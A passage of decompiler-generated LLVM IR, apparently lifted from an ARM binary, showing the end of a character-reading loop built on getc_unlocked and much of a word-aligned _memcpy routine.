  %v3_1d19c = inttoptr i32 %v2_1d19c to i32*
  store i32 %v0_1d19c, i32* %v3_1d19c, align 4
  br i1 %v7_1d198, label %dec_label_pc_1d1dc, label %dec_label_pc_1d1d4.backedge

dec_label_pc_1d1a4:                               ; preds = %dec_label_pc_1d180
  %v1_1d1a4 = inttoptr i32 %v0_1d1a4 to i16*
  %v3_1d1a8 = call i32 @getc_unlocked(i16* %v1_1d1a4)
  %v3_1d1ac = icmp eq i32 %v3_1d1a8, -1
  store i1 %v3_1d1ac, i1* %cpsr_c.global-to-local, align 1
  %v8_1d1ac = icmp eq i32 %v3_1d1a8, -1
  store i1 %v8_1d1ac, i1* %cpsr_z.global-to-local, align 1
  %v1_1d1b0 = urem i32 %v3_1d1a8, 256
  store i32 %v1_1d1b0, i32* %r3.global-to-local, align 4
  br i1 %v3_1d1ac, label %dec_label_pc_1d1b8, label %dec_label_pc_1d1d0

dec_label_pc_1d1b8:                               ; preds = %dec_label_pc_1d1a4
  %v0_1d1b8 = load i32, i32* @r4, align 4
  %v1_1d1b8 = inttoptr i32 %v0_1d1b8 to i16*
  %v2_1d1b8 = load i16, i16* %v1_1d1b8, align 2
  %v3_1d1b8 = zext i16 %v2_1d1b8 to i32
  store i32 %v3_1d1b8, i32* %r3.global-to-local, align 4
  %v1_1d1bc = and i32 %v3_1d1b8, 8
  %v2_1d1bc = icmp eq i32 %v1_1d1bc, 0
  store i1 %v2_1d1bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d1bc, label %dec_label_pc_1d1dc, label %dec_label_pc_1d1ec

dec_label_pc_1d1d0:                               ; preds = %dec_label_pc_1d1a4
  %v1_1d1c8 = trunc i32 %v3_1d1a8 to i8
  %v2_1d1c8 = load i32, i32* @r5, align 4
  %v3_1d1c8 = inttoptr i32 %v2_1d1c8 to i8*
  store i8 %v1_1d1c8, i8* %v3_1d1c8, align 1
  %v4_1d1c8 = load i32, i32* @r5, align 4
  %v5_1d1c8 = add i32 %v4_1d1c8, 1
  store i32 %v5_1d1c8, i32* @r5, align 4
  %v0_1d1cc = load i32, i32* %r3.global-to-local, align 4
  %v2_1d1cc = icmp ugt i32 %v0_1d1cc, 9
  store i1 %v2_1d1cc, i1* %cpsr_c.global-to-local, align 1
  %v7_1d1cc = icmp eq i32 %v0_1d1cc, 10
  store i1 %v7_1d1cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d1cc, label %dec_label_pc_1d1dc, label %dec_label_pc_1d1d4.backedge

dec_label_pc_1d1d4.backedge:                      ; preds = %dec_label_pc_1d1d0, %dec_label_pc_1d190
  %v0_1d1d4 = load i32, i32* @r6, align 4
  %v1_1d1d4 = add i32 %v0_1d1d4, -1
  store i32 %v1_1d1d4, i32* @r6, align 4
  %v2_1d1d4 = icmp ne i32 %v0_1d1d4, 0
  store i1 %v2_1d1d4, i1* %cpsr_c.global-to-local, align 1
  %v7_1d1d4 = icmp eq i32 %v0_1d1d4, 1
  store i1 %v7_1d1d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d1d4, label %dec_label_pc_1d1dc, label %dec_label_pc_1d1d4.backedge.dec_label_pc_1d180_crit_edge

dec_label_pc_1d1d4.backedge.dec_label_pc_1d180_crit_edge: ; preds = %dec_label_pc_1d1d4.backedge
  %v0_1d180.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1d180

dec_label_pc_1d1dc:                               ; preds = %dec_label_pc_1d1d0, %dec_label_pc_1d1d4.backedge, %dec_label_pc_1d190, %dec_label_pc_1d1d4.preheader, %dec_label_pc_1d1b8
  %v0_1d1dc = load i32, i32* @r5, align 4
  %v1_1d1dc = load i32, i32* @r7, align 4
  %v3_1d1dc = icmp uge i32 %v0_1d1dc, %v1_1d1dc
  store i1 %v3_1d1dc, i1* %cpsr_c.global-to-local, align 1
  %v9_1d1dc = icmp eq i32 %v0_1d1dc, %v1_1d1dc
  store i1 %v9_1d1dc, i1* %cpsr_z.global-to-local, align 1
  %v2_1d1e0 = xor i1 %v9_1d1dc, true
  %v3_1d1e0 = and i1 %v3_1d1dc, %v2_1d1e0
  br i1 %v3_1d1e0, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1d1dc
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1d1e4 = inttoptr i32 %v0_1d1dc to i8*
  store i8 0, i8* %v7_1d1e4, align 1
  %v0_1d1e8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1d1e8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1d1dc, %bb
  %v1_1d1e8 = phi i1 [ %v1_1d1e8.pre, %bb ], [ %v9_1d1dc, %dec_label_pc_1d1dc ]
  %v0_1d1e8 = phi i1 [ %v0_1d1e8.pre, %bb ], [ %v3_1d1dc, %dec_label_pc_1d1dc ]
  %v2_1d1e8 = xor i1 %v1_1d1e8, true
  %v3_1d1e8 = and i1 %v0_1d1e8, %v2_1d1e8
  br i1 %v3_1d1e8, label %.dec_label_pc_1d1f0_crit_edge, label %dec_label_pc_1d1ec

.dec_label_pc_1d1f0_crit_edge:                    ; preds = %.thread14
  %v0_1d1f0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1d1f0

dec_label_pc_1d1ec:                               ; preds = %entry, %dec_label_pc_1d1b8, %.thread14
  br label %dec_label_pc_1d1f0

dec_label_pc_1d1f0:                               ; preds = %.dec_label_pc_1d1f0_crit_edge, %dec_label_pc_1d1ec
  %v0_1d1f0 = phi i32 [ %v0_1d1f0.pre, %.dec_label_pc_1d1f0_crit_edge ], [ 0, %dec_label_pc_1d1ec ]
  store i32 %v9_1d160, i32* @r6, align 4
  store i32 %v12_1d160, i32* @r7, align 4
  ret i32 %v0_1d1f0

; uselistorder directives
  uselistorder i1 %v9_1d1dc, { 1, 0, 2 }
  uselistorder i32 %v1_1d1dc, { 1, 0 }
  uselistorder i32 %v0_1d1dc, { 0, 2, 1 }
  uselistorder i32 %v0_1d1d4, { 2, 0, 1 }
  uselistorder i32 %v0_1d1cc, { 1, 0 }
  uselistorder i32 %v3_1d1a8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1d198, { 1, 0 }
  uselistorder i32 %v3_1d180, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1d1a4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1d1f0, { 1, 0 }
  uselistorder label %dec_label_pc_1d1ec, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1d1dc, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1d180, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_1d200 = load i32, i32* @r1, align 4
  %v1_1d200 = load i32, i32* %r0.global-to-local, align 4
  %v2_1d200 = sub i32 %v0_1d200, %v1_1d200
  %v3_1d200 = icmp ult i32 %v0_1d200, %v1_1d200
  %v4_1d200 = xor i32 %v1_1d200, %v0_1d200
  %v5_1d200 = xor i32 %v2_1d200, %v0_1d200
  %v6_1d200 = and i32 %v5_1d200, %v4_1d200
  %v7_1d200 = icmp slt i32 %v6_1d200, 0
  store i1 %v7_1d200, i1* %cpsr_v.global-to-local, align 1
  %v8_1d200 = icmp slt i32 %v2_1d200, 0
  store i1 %v8_1d200, i1* %cpsr_n.global-to-local, align 1
  %v9_1d200 = icmp eq i32 %v0_1d200, %v1_1d200
  store i1 %v9_1d200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1d200, label %dec_label_pc_1d454, label %dec_label_pc_1d208

dec_label_pc_1d208:                               ; preds = %entry
  br i1 %v9_1d200, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_1d208
  ret i32 %v0_1d200

bb79:                                             ; preds = %dec_label_pc_1d208
  %v5_1d20c = inttoptr i32 %v1_1d200 to i8*
  store i8* %v5_1d20c, i8** %stack_var_-8, align 4
  %v8_1d20c = load i32, i32* @lr, align 4
  %v0_1d210 = load i32, i32* @r2, align 4
  %v2_1d210 = add i32 %v0_1d210, -4
  store i32 %v2_1d210, i32* %r2.global-to-local, align 4
  %v4_1d210 = sub i32 3, %v0_1d210
  %v5_1d210 = and i32 %v4_1d210, %v0_1d210
  %v6_1d210 = icmp slt i32 %v5_1d210, 0
  store i1 %v6_1d210, i1* %cpsr_v.global-to-local, align 1
  %v7_1d210 = icmp slt i32 %v2_1d210, 0
  store i1 %v7_1d210, i1* %cpsr_n.global-to-local, align 1
  %v8_1d210 = icmp eq i32 %v0_1d210, 4
  store i1 %v8_1d210, i1* %cpsr_z.global-to-local, align 1
  %v5_1d214 = icmp slt i32 %v0_1d210, 4
  br i1 %v5_1d214, label %bb84, label %dec_label_pc_1d218

dec_label_pc_1d218:                               ; preds = %bb79
  %v1_1d218 = urem i32 %v1_1d200, 4
  store i32 %v1_1d218, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1d218 = icmp eq i32 %v1_1d218, 0
  store i1 %v2_1d218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d218, label %dec_label_pc_1d220, label %dec_label_pc_1d2cc

dec_label_pc_1d220:                               ; preds = %dec_label_pc_1d218
  %v1_1d220 = urem i32 %v0_1d200, 4
  store i32 %v1_1d220, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1d220 = icmp eq i32 %v1_1d220, 0
  store i1 %v2_1d220, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_1d200 to i2
  br i1 %v2_1d220, label %dec_label_pc_1d228, label %dec_label_pc_1d2fc

dec_label_pc_1d228:                               ; preds = %dec_label_pc_1d220, %dec_label_pc_1d2f4
  %v0_1d24038 = phi i32 [ %v1_1d200, %dec_label_pc_1d220 ], [ %v0_1d41c21, %dec_label_pc_1d2f4 ]
  %v0_1d23c37 = phi i32 [ %v0_1d200, %dec_label_pc_1d220 ], [ %v0_1d2f4, %dec_label_pc_1d2f4 ]
  %v0_1d228 = phi i32 [ %v2_1d210, %dec_label_pc_1d220 ], [ %v2_1d2ec, %dec_label_pc_1d2f4 ]
  %v1_1d228 = add i32 %v0_1d228, -8
  store i32 %v1_1d228, i32* %r2.global-to-local, align 4
  %v3_1d228 = sub i32 7, %v0_1d228
  %v4_1d228 = and i32 %v3_1d228, %v0_1d228
  %v5_1d228 = icmp slt i32 %v4_1d228, 0
  store i1 %v5_1d228, i1* %cpsr_v.global-to-local, align 1
  %v6_1d228 = icmp slt i32 %v1_1d228, 0
  store i1 %v6_1d228, i1* %cpsr_n.global-to-local, align 1
  %v7_1d228 = icmp eq i32 %v0_1d228, 8
  store i1 %v7_1d228, i1* %cpsr_z.global-to-local, align 1
  %v2_1d22c = xor i1 %v6_1d228, %v5_1d228
  br i1 %v2_1d22c, label %dec_label_pc_1d27c, label %dec_label_pc_1d230

dec_label_pc_1d230:                               ; preds = %dec_label_pc_1d228
  %v1_1d230 = add i32 %v0_1d228, -28
  store i32 %v1_1d230, i32* %r2.global-to-local, align 4
  %v3_1d230 = sub i32 27, %v0_1d228
  %v4_1d230 = and i32 %v3_1d230, %v1_1d228
  %v5_1d230 = icmp slt i32 %v4_1d230, 0
  store i1 %v5_1d230, i1* %cpsr_v.global-to-local, align 1
  %v6_1d230 = icmp slt i32 %v1_1d230, 0
  store i1 %v6_1d230, i1* %cpsr_n.global-to-local, align 1
  %v7_1d230 = icmp eq i32 %v1_1d228, 20
  store i1 %v7_1d230, i1* %cpsr_z.global-to-local, align 1
  %v2_1d234 = xor i1 %v6_1d230, %v5_1d230
  br i1 %v2_1d234, label %dec_label_pc_1d268, label %dec_label_pc_1d238

dec_label_pc_1d238:                               ; preds = %dec_label_pc_1d230
  %v0_1d238 = load i32, i32* @r4, align 4
  store i32 %v0_1d238, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1d23c

dec_label_pc_1d23c:                               ; preds = %dec_label_pc_1d23c.dec_label_pc_1d23c_crit_edge, %dec_label_pc_1d238
  %v0_1d240 = phi i32 [ %v12_1d248, %dec_label_pc_1d23c.dec_label_pc_1d23c_crit_edge ], [ %v0_1d24038, %dec_label_pc_1d238 ]
  %v0_1d23c = phi i32 [ %v0_1d23c.pre, %dec_label_pc_1d23c.dec_label_pc_1d23c_crit_edge ], [ %v0_1d23c37, %dec_label_pc_1d238 ]
  %v1_1d23c = inttoptr i32 %v0_1d23c to i32*
  %v2_1d23c = load i32, i32* %v1_1d23c, align 4
  %v3_1d23c = add i32 %v0_1d23c, 4
  %v4_1d23c = inttoptr i32 %v3_1d23c to i32*
  %v5_1d23c = load i32, i32* %v4_1d23c, align 4
  store i32 %v5_1d23c, i32* %r4.global-to-local, align 4
  %v6_1d23c = add i32 %v0_1d23c, 8
  %v7_1d23c = inttoptr i32 %v6_1d23c to i32*
  %v8_1d23c = load i32, i32* %v7_1d23c, align 4
  store i32 %v8_1d23c, i32* %ip.global-to-local, align 4
  %v9_1d23c = add i32 %v0_1d23c, 12
  %v10_1d23c = inttoptr i32 %v9_1d23c to i32*
  %v11_1d23c = load i32, i32* %v10_1d23c, align 4
  store i32 %v11_1d23c, i32* %lr.global-to-local, align 4
  %v12_1d23c = add i32 %v0_1d23c, 16
  store i32 %v12_1d23c, i32* %r1.global-to-local, align 4
  %v1_1d240 = inttoptr i32 %v0_1d240 to i32*
  store i32 %v2_1d23c, i32* %v1_1d240, align 4
  %v3_1d240 = add i32 %v0_1d240, 4
  %v4_1d240 = inttoptr i32 %v3_1d240 to i32*
  %v5_1d240 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1d240, i32* %v4_1d240, align 4
  %v6_1d240 = add i32 %v0_1d240, 8
  %v7_1d240 = inttoptr i32 %v6_1d240 to i32*
  %v8_1d240 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_1d240, i32* %v7_1d240, align 4
  %v9_1d240 = add i32 %v0_1d240, 12
  %v10_1d240 = inttoptr i32 %v9_1d240 to i32*
  %v11_1d240 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1d240, i32* %v10_1d240, align 4
  %v12_1d240 = add i32 %v0_1d240, 16
  store i32 %v12_1d240, i32* %r0.global-to-local, align 4
  %v0_1d244 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d244 = inttoptr i32 %v0_1d244 to i32*
  %v2_1d244 = load i32, i32* %v1_1d244, align 4
  store i32 %v2_1d244, i32* @r3, align 4
  %v3_1d244 = add i32 %v0_1d244, 4
  %v4_1d244 = inttoptr i32 %v3_1d244 to i32*
  %v5_1d244 = load i32, i32* %v4_1d244, align 4
  store i32 %v5_1d244, i32* %r4.global-to-local, align 4
  %v6_1d244 = add i32 %v0_1d244, 8
  %v7_1d244 = inttoptr i32 %v6_1d244 to i32*
  %v8_1d244 = load i32, i32* %v7_1d244, align 4
  store i32 %v8_1d244, i32* @ip, align 4
  %v9_1d244 = add i32 %v0_1d244, 12
  %v10_1d244 = inttoptr i32 %v9_1d244 to i32*
  %v11_1d244 = load i32, i32* %v10_1d244, align 4
  store i32 %v11_1d244, i32* %lr.global-to-local, align 4
  %v12_1d244 = add i32 %v0_1d244, 16
  store i32 %v12_1d244, i32* @r1, align 4
  %v1_1d248 = inttoptr i32 %v12_1d240 to i32*
  store i32 %v2_1d244, i32* %v1_1d248, align 4
  %v3_1d248 = add i32 %v0_1d240, 20
  %v4_1d248 = inttoptr i32 %v3_1d248 to i32*
  %v5_1d248 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1d248, i32* %v4_1d248, align 4
  %v6_1d248 = add i32 %v0_1d240, 24
  %v7_1d248 = inttoptr i32 %v6_1d248 to i32*
  %v8_1d248 = load i32, i32* @ip, align 4
  store i32 %v8_1d248, i32* %v7_1d248, align 4
  %v9_1d248 = add i32 %v0_1d240, 28
  %v10_1d248 = inttoptr i32 %v9_1d248 to i32*
  %v11_1d248 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1d248, i32* %v10_1d248, align 4
  %v12_1d248 = add i32 %v0_1d240, 32
  store i32 %v12_1d248, i32* %r0.global-to-local, align 4
  %v0_1d24c = load i32, i32* %r2.global-to-local, align 4
  %v1_1d24c = add i32 %v0_1d24c, -32
  store i32 %v1_1d24c, i32* %r2.global-to-local, align 4
  %v3_1d24c = sub i32 31, %v0_1d24c
  %v4_1d24c = and i32 %v3_1d24c, %v0_1d24c
  %v5_1d24c = icmp slt i32 %v4_1d24c, 0
  %v6_1d24c = icmp slt i32 %v1_1d24c, 0
  %v2_1d250 = xor i1 %v6_1d24c, %v5_1d24c
  br i1 %v2_1d250, label %dec_label_pc_1d254, label %dec_label_pc_1d23c.dec_label_pc_1d23c_crit_edge

dec_label_pc_1d23c.dec_label_pc_1d23c_crit_edge:  ; preds = %dec_label_pc_1d23c
  %v0_1d23c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1d23c

dec_label_pc_1d254:                               ; preds = %dec_label_pc_1d23c
  %v1_1d254 = add i32 %v0_1d24c, -16
  %v3_1d254 = add i32 %v0_1d24c, 2147483616
  %v4_1d254 = and i32 %v1_1d254, %v3_1d254
  %v5_1d254 = icmp slt i32 %v4_1d254, 0
  store i1 %v5_1d254, i1* %cpsr_v.global-to-local, align 1
  %v6_1d254 = icmp slt i32 %v1_1d254, 0
  store i1 %v6_1d254, i1* %cpsr_n.global-to-local, align 1
  %v7_1d254 = icmp eq i32 %v1_1d254, 0
  store i1 %v7_1d254, i1* %cpsr_z.global-to-local, align 1
  %v2_1d258 = xor i1 %v6_1d254, %v5_1d254
  br i1 %v2_1d258, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_1d254
  %v3_1d258 = load i32, i32* @r1, align 4
  %v4_1d258 = inttoptr i32 %v3_1d258 to i32*
  %v5_1d258 = load i32, i32* %v4_1d258, align 4
  store i32 %v5_1d258, i32* @r3, align 4
  %v6_1d258 = add i32 %v3_1d258, 4
  %v7_1d258 = inttoptr i32 %v6_1d258 to i32*
  %v8_1d258 = load i32, i32* %v7_1d258, align 4
  store i32 %v8_1d258, i32* %r4.global-to-local, align 4
  %v9_1d258 = add i32 %v3_1d258, 8
  %v10_1d258 = inttoptr i32 %v9_1d258 to i32*
  %v11_1d258 = load i32, i32* %v10_1d258, align 4
  store i32 %v11_1d258, i32* @ip, align 4
  %v12_1d258 = add i32 %v3_1d258, 12
  %v13_1d258 = inttoptr i32 %v12_1d258 to i32*
  %v14_1d258 = load i32, i32* %v13_1d258, align 4
  store i32 %v14_1d258, i32* %lr.global-to-local, align 4
  %v15_1d258 = add i32 %v3_1d258, 16
  store i32 %v15_1d258, i32* @r1, align 4
  %v4_1d25c = inttoptr i32 %v12_1d248 to i32*
  store i32 %v5_1d258, i32* %v4_1d25c, align 4
  %v6_1d25c = add i32 %v0_1d240, 36
  %v7_1d25c = inttoptr i32 %v6_1d25c to i32*
  %v8_1d25c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1d25c, i32* %v7_1d25c, align 4
  %v9_1d25c = add i32 %v0_1d240, 40
  %v10_1d25c = inttoptr i32 %v9_1d25c to i32*
  %v11_1d25c = load i32, i32* @ip, align 4
  store i32 %v11_1d25c, i32* %v10_1d25c, align 4
  %v12_1d25c = add i32 %v0_1d240, 44
  %v13_1d25c = inttoptr i32 %v12_1d25c to i32*
  %v14_1d25c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1d25c, i32* %v13_1d25c, align 4
  %v15_1d25c = add i32 %v0_1d240, 48
  store i32 %v15_1d25c, i32* %r0.global-to-local, align 4
  %v3_1d260 = load i32, i32* %r2.global-to-local, align 4
  %v4_1d260 = add i32 %v3_1d260, -16
  store i32 %v4_1d260, i32* %r2.global-to-local, align 4
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_1d254, %bb80
  %v3_1d2704655 = phi i32 [ %v15_1d25c, %bb80 ], [ %v12_1d248, %dec_label_pc_1d254 ]
  %v0_1d268.pre = phi i32 [ %v4_1d260, %bb80 ], [ %v1_1d24c, %dec_label_pc_1d254 ]
  %v2_1d264 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1d264, i32* @r4, align 4
  br label %dec_label_pc_1d268

dec_label_pc_1d268:                               ; preds = %dec_label_pc_1d230, %bb81
  %v3_1d27045 = phi i32 [ %v0_1d24038, %dec_label_pc_1d230 ], [ %v3_1d2704655, %bb81 ]
  %v0_1d268 = phi i32 [ %v1_1d230, %dec_label_pc_1d230 ], [ %v0_1d268.pre, %bb81 ]
  %v1_1d268 = add i32 %v0_1d268, 20
  store i32 %v1_1d268, i32* %r2.global-to-local, align 4
  %v3_1d268 = sub i32 0, %v0_1d268
  %v4_1d268 = and i32 %v1_1d268, %v3_1d268
  %v5_1d268 = icmp slt i32 %v4_1d268, 0
  store i1 %v5_1d268, i1* %cpsr_v.global-to-local, align 1
  %v6_1d268 = icmp slt i32 %v1_1d268, 0
  store i1 %v6_1d268, i1* %cpsr_n.global-to-local, align 1
  %v7_1d268 = icmp eq i32 %v1_1d268, 0
  store i1 %v7_1d268, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1d26c

dec_label_pc_1d26c:                               ; preds = %.thread59, %dec_label_pc_1d268
  %v0_1d27c.pre92 = phi i32 [ %v0_1d27c.pre, %.thread59 ], [ %v1_1d268, %dec_label_pc_1d268 ]
  %v3_1d270 = phi i32 [ %v3_1d2704360, %.thread59 ], [ %v3_1d27045, %dec_label_pc_1d268 ]
  %v1_1d274 = phi i1 [ %v1_1d278, %.thread59 ], [ %v5_1d268, %dec_label_pc_1d268 ]
  %v0_1d274 = phi i1 [ %v0_1d278, %.thread59 ], [ %v6_1d268, %dec_label_pc_1d268 ]
  %v2_1d26c = xor i1 %v1_1d274, %v0_1d274
  br i1 %v2_1d26c, label %.thread59, label %bb82

bb82:                                             ; preds = %dec_label_pc_1d26c
  %v3_1d26c = load i32, i32* @r1, align 4
  %v4_1d26c = inttoptr i32 %v3_1d26c to i32*
  %v5_1d26c = load i32, i32* %v4_1d26c, align 4
  store i32 %v5_1d26c, i32* @r3, align 4
  %v6_1d26c = add i32 %v3_1d26c, 4
  %v7_1d26c = inttoptr i32 %v6_1d26c to i32*
  %v8_1d26c = load i32, i32* %v7_1d26c, align 4
  store i32 %v8_1d26c, i32* @ip, align 4
  %v9_1d26c = add i32 %v3_1d26c, 8
  %v10_1d26c = inttoptr i32 %v9_1d26c to i32*
  %v11_1d26c = load i32, i32* %v10_1d26c, align 4
  store i32 %v11_1d26c, i32* %lr.global-to-local, align 4
  %v12_1d26c = add i32 %v3_1d26c, 12
  store i32 %v12_1d26c, i32* @r1, align 4
  %v4_1d270 = inttoptr i32 %v3_1d270 to i32*
  store i32 %v5_1d26c, i32* %v4_1d270, align 4
  %v6_1d270 = add i32 %v3_1d270, 4
  %v7_1d270 = inttoptr i32 %v6_1d270 to i32*
  %v8_1d270 = load i32, i32* @ip, align 4
  store i32 %v8_1d270, i32* %v7_1d270, align 4
  %v9_1d270 = add i32 %v3_1d270, 8
  %v10_1d270 = inttoptr i32 %v9_1d270 to i32*
  %v11_1d270 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1d270, i32* %v10_1d270, align 4
  %v12_1d270 = add i32 %v3_1d270, 12
  store i32 %v12_1d270, i32* %r0.global-to-local, align 4
  %v3_1d274 = load i32, i32* %r2.global-to-local, align 4
  %v4_1d274 = add i32 %v3_1d274, -12
  store i32 %v4_1d274, i32* %r2.global-to-local, align 4
  %v6_1d274 = sub i32 11, %v3_1d274
  %v7_1d274 = and i32 %v6_1d274, %v3_1d274
  %v8_1d274 = icmp slt i32 %v7_1d274, 0
  store i1 %v8_1d274, i1* %cpsr_v.global-to-local, align 1
  %v9_1d274 = icmp slt i32 %v4_1d274, 0
  store i1 %v9_1d274, i1* %cpsr_n.global-to-local, align 1
  %v10_1d274 = icmp eq i32 %v3_1d274, 12
  store i1 %v10_1d274, i1* %cpsr_z.global-to-local, align 1
  br label %.thread59

.thread59:                                        ; preds = %dec_label_pc_1d26c, %bb82
  %v0_1d27c.pre = phi i32 [ %v4_1d274, %bb82 ], [ %v0_1d27c.pre92, %dec_label_pc_1d26c ]
  %v3_1d2704360 = phi i32 [ %v12_1d270, %bb82 ], [ %v3_1d270, %dec_label_pc_1d26c ]
  %v1_1d278 = phi i1 [ %v8_1d274, %bb82 ], [ %v1_1d274, %dec_label_pc_1d26c ]
  %v0_1d278 = phi i1 [ %v9_1d274, %bb82 ], [ %v0_1d274, %dec_label_pc_1d26c ]
  %v2_1d278 = xor i1 %v1_1d278, %v0_1d278
  br i1 %v2_1d278, label %dec_label_pc_1d27c, label %dec_label_pc_1d26c

dec_label_pc_1d27c:                               ; preds = %.thread59, %dec_label_pc_1d228
  %v4_1d28c = phi i32 [ %v0_1d24038, %dec_label_pc_1d228 ], [ %v3_1d2704360, %.thread59 ]
  %v0_1d27c = phi i32 [ %v1_1d228, %dec_label_pc_1d228 ], [ %v0_1d27c.pre, %.thread59 ]
  %v1_1d27c = add i32 %v0_1d27c, 8
  store i32 %v1_1d27c, i32* %r2.global-to-local, align 4
  %v3_1d27c = sub i32 0, %v0_1d27c
  %v4_1d27c = and i32 %v1_1d27c, %v3_1d27c
  %v5_1d27c = icmp slt i32 %v4_1d27c, 0
  store i1 %v5_1d27c, i1* %cpsr_v.global-to-local, align 1
  %v6_1d27c = icmp slt i32 %v1_1d27c, 0
  store i1 %v6_1d27c, i1* %cpsr_n.global-to-local, align 1
  %v7_1d27c = icmp eq i32 %v1_1d27c, 0
  store i1 %v7_1d27c, i1* %cpsr_z.global-to-local, align 1
  %v2_1d280 = xor i1 %v6_1d27c, %v5_1d27c
  br i1 %v2_1d280, label %bb84, label %dec_label_pc_1d284

dec_label_pc_1d284:                               ; preds = %dec_label_pc_1d27c
  %v1_1d284 = add i32 %v0_1d27c, 4
  store i32 %v1_1d284, i32* %r2.global-to-local, align 4
  %v3_1d284 = sub i32 -5, %v0_1d27c
  %v4_1d284 = and i32 %v3_1d284, %v1_1d27c
  %v5_1d284 = icmp slt i32 %v4_1d284, 0
  store i1 %v5_1d284, i1* %cpsr_v.global-to-local, align 1
  %v6_1d284 = icmp slt i32 %v1_1d284, 0
  store i1 %v6_1d284, i1* %cpsr_n.global-to-local, align 1
  %v7_1d284 = icmp eq i32 %v1_1d27c, 4
  store i1 %v7_1d284, i1* %cpsr_z.global-to-local, align 1
  %v2_1d288 = xor i1 %v6_1d284, %v5_1d284
  %v3_1d288 = load i32, i32* @r1, align 4
  %v4_1d288 = inttoptr i32 %v3_1d288 to i32*
  %v5_1d288 = load i32, i32* %v4_1d288, align 4
  store i32 %v5_1d288, i32* @r3, align 4
  %v7_1d288 = add i32 %v3_1d288, 4
  br i1 %v2_1d288, label %.thread66, label %bb83

.thread66:                                        ; preds = %dec_label_pc_1d284
  store i32 %v7_1d288, i32* @r1, align 4
  %v5_1d28c = inttoptr i32 %v4_1d28c to i32*
  store i32 %v5_1d288, i32* %v5_1d28c, align 4
  %v6_1d28c = load i32, i32* %r0.global-to-local, align 4
  %v7_1d28c = add i32 %v6_1d28c, 4
  store i32 %v7_1d28c, i32* %r0.global-to-local, align 4
  %v0_1d29c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_1d284
  %v7_1d290 = inttoptr i32 %v7_1d288 to i32*
  %v8_1d290 = load i32, i32* %v7_1d290, align 4
  store i32 %v8_1d290, i32* @ip, align 4
  %v9_1d290 = add i32 %v3_1d288, 8
  store i32 %v9_1d290, i32* @r1, align 4
  %v4_1d294 = inttoptr i32 %v4_1d28c to i32*
  store i32 %v5_1d288, i32* %v4_1d294, align 4
  %v6_1d294 = add i32 %v4_1d28c, 4
  %v7_1d294 = inttoptr i32 %v6_1d294 to i32*
  %v8_1d294 = load i32, i32* @ip, align 4
  store i32 %v8_1d294, i32* %v7_1d294, align 4
  %v9_1d294 = add i32 %v4_1d28c, 8
  store i32 %v9_1d294, i32* %r0.global-to-local, align 4
  %v3_1d298 = load i32, i32* %r2.global-to-local, align 4
  %v4_1d298 = add i32 %v3_1d298, -4
  store i32 %v4_1d298, i32* %r2.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %.thread66, %.thread72, %dec_label_pc_1d27c, %bb79, %dec_label_pc_1d44c, %dec_label_pc_1d3e0, %dec_label_pc_1d374, %bb83
